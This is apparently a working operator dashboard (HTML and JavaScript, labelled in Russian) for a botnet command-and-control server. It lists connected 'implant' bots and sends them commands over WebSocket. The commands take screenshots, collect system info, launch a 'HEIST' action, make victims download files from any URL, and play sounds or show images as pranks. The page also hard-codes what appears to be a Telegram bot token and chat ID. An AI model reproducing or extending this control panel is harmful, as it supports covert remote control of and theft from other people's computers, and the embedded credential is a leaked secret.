<!DOCTYPE html>
<!-- Файл: index.html (Версия 5.5 - "Строгий Костюм") -->
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>C2 Коммандный Мостик v5.5</title>
  <style>
    :root {
      --bg-color: #1a1a1c; --primary-color: #2e2e33; --secondary-color: #45454d;
      --text-color: #e1e1e1; --accent-color: #00aaff;
      /* --- НОВАЯ, СТРОГАЯ ПАЛИТРА --- */
      --action-color: #007bff; /* Основной синий для всех действий */
      --danger-color: #dc3545; /* Красный для опасных действий */
      --error-color: #ff4d4d; --success-color: #33cc33;
    }
    html, body { height: 100%; margin: 0; padding: 0; overflow: hidden; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background-color: var(--bg-color); color: var(--text-color); }
    .container { display: flex; flex-direction: column; height: 100%; }
    header { flex-shrink: 0; color: var(--accent-color); text-align: center; padding: 20px 0; border-bottom: 1px solid var(--secondary-color); }
    h1, h2, h3 { margin: 0;}
    h2 { color: var(--accent-color); padding-bottom: 10px; margin-bottom: 20px; border-bottom: 1px solid var(--secondary-color); }
    h3 { margin-top: 20px; margin-bottom: 10px; text-align: center; border-top: 1px solid var(--secondary-color); padding-top: 20px; }
    .app-layout { display: flex; flex-grow: 1; overflow: hidden; padding: 25px; gap: 25px; }
    .sidebar { flex: 0 0 300px; background-color: var(--primary-color); border-radius: 12px; border: 1px solid var(--secondary-color); display: flex; flex-direction: column; overflow: hidden; }
    .sidebar h2 { padding: 25px; margin: 0; }
    #bot-list { flex-grow: 1; overflow-y: auto; padding: 0 25px 25px; display: flex; flex-direction: column; gap: 10px; }
    .main-content { flex-grow: 1; overflow-y: auto; padding-right: 10px; }
    section { background-color: var(--primary-color); padding: 25px; border-radius: 12px; border: 1px solid var(--secondary-color); margin-bottom: 25px; }
    .log-container { flex-shrink: 0; height: 200px; background-color: #111; border-top: 1px solid var(--secondary-color); display: flex; flex-direction: column; padding: 10px; font-family: 'Courier New', Courier, monospace; }
    #log-list { flex-grow: 1; overflow-y: auto; font-size: 0.9em; }
    .log-entry { margin: 2px 0; white-space: pre-wrap; word-break: break-all; }
    .log-info { color: var(--text-color); }
    .log-success { color: var(--success-color); }
    .log-error { color: var(--error-color); }
    .log-command { color: var(--accent-color); }
    .log-timestamp { color: var(--secondary-color); margin-right: 10px; }
    footer { display: none; }
    button { color: white; padding: 12px 20px; border: none; border-radius: 8px; cursor: pointer; font-size: 1em; font-weight: bold; width: 100%; transition: background-color 0.2s; box-sizing: border-box; }
    button:hover { filter: brightness(1.2); }

    /* --- НОВЫЕ СТИЛИ КНОПОК --- */
    .btn-bot { background-color: #495057; }
    .btn-bot.selected { border: 3px solid var(--accent-color); background-color: #0056b3; }
    .btn-action { background-color: var(--action-color); } /* Единый стиль для всех обычных кнопок */
    .btn-danger { background-color: var(--danger-color); } /* Стиль для опасных кнопок */

    .grid-controls { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 15px; }
    .thumbnail-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 15px; }
    .thumbnail-item { text-align: center; cursor: pointer; background-color: var(--secondary-color); padding: 10px; border-radius: 8px; }
    .thumbnail-item img { width: 100px; height: 100px; object-fit: cover; border: 2px solid var(--bg-color); border-radius: 8px; }
    .thumbnail-item p { margin: 8px 0 0 0; font-size: 0.8em; word-wrap: break-word; }
    input[type="text"] { width: 100%; padding: 10px; margin-bottom: 10px; border-radius: 8px; border: 1px solid var(--secondary-color); background-color: var(--bg-color); color: var(--text-color); box-sizing: border-box; }
    input[type="range"] { width: 100%; }
    @media (max-width: 900px) { .app-layout { flex-direction: column; padding: 15px; } .sidebar { flex: 0 0 auto; max-height: 30vh; } .log-container { height: 150px; } }
  </style>
</head>
<body>
  <div class="container">
    <header><h1>Коммандный Мостик v5.5</h1></header>

    <main class="app-layout">
      <aside class="sidebar">
        <h2>Боты в сети</h2>
        <div id="bot-list"><p style="text-align:center;">Подключение к серверу...</p></div>
      </aside>

      <div class="main-content">
        <div id="controls-wrapper" style="display:none;">
          <section>
            <h2>Команды для (<span id="selected-bot-name"></span>)</h2>
            <div class="grid-controls">
              &lt;!-- ИЗМЕНЕНИЕ: Все кнопки теперь одного стиля -->
              <button class="btn-action" onclick="sendCommand({action: 'screenshot'})">Скриншот</button>
              <button class="btn-action" onclick="sendCommand({action: 'sysinfo'})">Инфо о системе</button>
              <button class="btn-danger" onclick="sendCommand({action: 'heist'})">ЗАПУСТИТЬ HEIST</button>
            </div>
          </section>
          <section>
            <h2>Загрузка новых файлов</h2>
            <input type="text" id="url-input" placeholder="URL файла (mp3, wav, jpg, png)...">
            <button class="btn-action" onclick="downloadFile()">Загрузить</button>
          </section>
          <section>
            <h2>Пранки и Медиа</h2>
            <div class="grid-controls">
              <div>
                <h3>Управление звуком</h3>
                <input type="range" id="volume-slider" min="0" max="100" value="50">
                <button class="btn-action" style="margin-top:10px" onclick="sendCommand({action: 'mute'})">Вкл/Выкл Звук</button>
              </div>
              <div>
                <h3>Локальные звуки</h3>
                <div id="audio-files-list" class="grid-controls"></div>
              </div>
            </div>
            <div>
              <h3 style="grid-column: 1 / -1;">Локальные изображения</h3>
              <div id="image-files-list" class="thumbnail-container"></div>
            </div>
          </section>
        </div>
      </div>
    </main>

    <div class="log-container">
      <div id="log-list"></div>
    </div>
  </div>

  <script>
    // ==============================================================================
    // JAVASCRIPT-МОЗГ (Без изменений в логике, только в стилях)
    // ==============================================================================
    const ui = {
      botList: document.getElementById('bot-list'), controlsWrapper: document.getElementById('controls-wrapper'),
      selectedBotName: document.getElementById('selected-bot-name'), logList: document.getElementById('log-list'),
      audioFilesList: document.getElementById('audio-files-list'), imageFilesList: document.getElementById('image-files-list'),
      volumeSlider: document.getElementById('volume-slider'), muteButton: document.querySelector("button[onclick*='mute']"),
      urlInput: document.getElementById('url-input'),
    };
    let socket, selectedBotId = null, pingInterval = null;

    const TG_BOT_TOKEN = "7650238850:AAFFcTP5uesNyAreZbW5_gL36brFObm2e34";
    const TG_CHAT_ID = "1640138978";

    function log(message, type = 'info') {
      const now = new Date();
      const timestamp = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
      const entry = document.createElement('div');
      entry.className = `log-entry log-${type}`;
      entry.innerHTML = `<span class="log-timestamp">${timestamp}</span> ${message}`;
      ui.logList.appendChild(entry);
      ui.logList.scrollTop = ui.logList.scrollHeight;
    }

    function connect() {
      log("Подключение к C2...");
      if (pingInterval) clearInterval(pingInterval);

      socket = new WebSocket(`${window.location.protocol === 'https' ? 'wss' : 'ws'}://${window.location.host}/ws`);

      socket.onopen = () => {
        log("Соединение установлено.", "success");
        socket.send(JSON.stringify({ type: 'operator'}));
        pingInterval = setInterval(() => { if (socket.readyState === WebSocket.OPEN) socket.send('ping'); }, 25000);
      };

      socket.onmessage = (event) => {
        if (event.data === 'pong') return;
        const msg = JSON.parse(event.data);
        if (msg.type === 'bot_list') { updateBotList(msg.data); }
        else if (msg.type === 'bot_details' && msg.bot_id === selectedBotId) { handleBotDetails(msg.data); }
        else if (msg.type === 'status') { log(`[${msg.bot_id.replace('implant_','')}] ${msg.data}`); }
        else if (msg.type === 'volume_update' && msg.bot_id === selectedBotId) { if(msg.data) ui.volumeSlider.value = msg.data.level; }
        else if (msg.type === 'file_list_update' && msg.bot_id === selectedBotId) { if(msg.data.files) renderBotFiles(msg.data.files); }
      };

      socket.onclose = () => {
        log("Соединение потеряно. Переподключение...", "error");
        if (pingInterval) clearInterval(pingInterval);
        selectBot(null);
        setTimeout(connect, 3000);
      };
    }

    function updateBotList(bots) {
      log(`Получен список ботов: [${bots.join(', ') || 'пусто'}]`);
      const currentSelected = selectedBotId;
      ui.botList.innerHTML = bots.length ? '' : '<p style="text-align:center;">Нет активных ботов.</p>';
      bots.forEach(botId => {
        const btn = document.createElement('button');
        btn.textContent = botId.replace('implant_', '');
        btn.className = 'btn-bot';
        btn.onclick = () => selectBot(botId);
        ui.botList.appendChild(btn);
      });
      if (currentSelected && bots.includes(currentSelected)) {
        selectBot(currentSelected, false);
      } else {
        selectBot(bots.length > 0 ? bots[0] : null, true);
      }
    }

    function selectBot(botId, requestDetails = true) {
      selectedBotId = botId;
      document.querySelectorAll('#bot-list .btn-bot').forEach(btn => {
        btn.classList.toggle('selected', `implant_${btn.textContent}` === botId);
      });
      if (botId) {
        if(requestDetails) log(`Выбран бот: ${botId.replace('implant_', '')}`);
        ui.controlsWrapper.style.display = 'block';
        ui.selectedBotName.textContent = botId.replace('implant_', '');
        if(requestDetails) socket.send(JSON.stringify({ type: 'get_details', target_id: botId }));
      } else {
        ui.controlsWrapper.style.display = 'none';
      }
    }

    function handleBotDetails(data) {
      log(`Получены детали для ${selectedBotId.replace('implant_', '')}`);
      if (data.files) renderBotFiles(data.files);
      if (data.volume_state) updateVolumeUI(data.volume_state);
      else if (data.volume !== undefined) ui.volumeSlider.value = data.volume;
    }

    function updateVolumeUI(state) {
      ui.volumeSlider.value = state.level;
      ui.muteButton.textContent = state.is_muted ? "ЗВУК ВЫКЛЮЧЕН" : "Вкл/Выкл Звук";
      ui.muteButton.style.backgroundColor = state.is_muted ? "var(--danger-color)" : "var(--action-color)";
    }

    function renderBotFiles(files) {
      const audioContainer = ui.audioFilesList;
      audioContainer.innerHTML = files.audio && files.audio.length ? '' : '<p>Аудио не найдено.</p>';
      if(files.audio) files.audio.forEach(file => {
        const btn = document.createElement('button'); btn.textContent = file;
        btn.className = 'btn-action'; // ИЗМЕНЕНИЕ: Единый стиль
        btn.onclick = () => sendCommand({ action: 'play', filename: file });
        audioContainer.appendChild(btn);
      });
      const imageContainer = ui.imageFilesList;
      imageContainer.innerHTML = files.image && files.image.length ? '' : '<p>Изображений не найдено.</p>';
      if(files.image) files.image.forEach(imgData => {
        const item = document.createElement('div'); item.className = 'thumbnail-item';
        item.onclick = () => sendCommand({action: 'show', filename: imgData.filename });
        const imgElement = document.createElement('img');
        imgElement.src = imgData.thumbnail ? `data:image/jpeg;base64,${imgData.thumbnail}` : 'https://via.placeholder.com/100x100.png?text=No+Preview';
        imgElement.alt = imgData.filename;
        const nameElement = document.createElement('p'); nameElement.textContent = imgData.filename;
        item.appendChild(imgElement); item.appendChild(nameElement);
        imageContainer.appendChild(item);
      });
    }

    function sendCommand(payload) {
      if (!selectedBotId) return;
      if (payload.action === 'heist' && !confirm(`ТЫ УВЕРЕН, ЧТО ХОЧЕШЬ ЗАПУСТИТЬ HEIST НА ${selectedBotId.replace('implant_', '')}?`)) return;
      socket.send(JSON.stringify({ type: 'command', target_id: selectedBotId, payload }));
      log(`Команда '${payload.action}' -> ${selectedBotId.replace('implant_', '')}`, 'command');
    }

    const debounce = (func, delay) => { let timeout; return (...args) => { clearTimeout(timeout); timeout = setTimeout(() => func(...args), delay); }; };
    const setVolume = debounce(value => sendCommand({ action: 'volume', level: value }), 250);
    ui.volumeSlider.addEventListener('input', (event) => setVolume(event.target.value));

    function downloadFile() {
      const url = ui.urlInput.value.trim();
      if (url) { sendCommand({ action: 'download', url }); }
    }

    connect();
  </script>
</body>
</html>
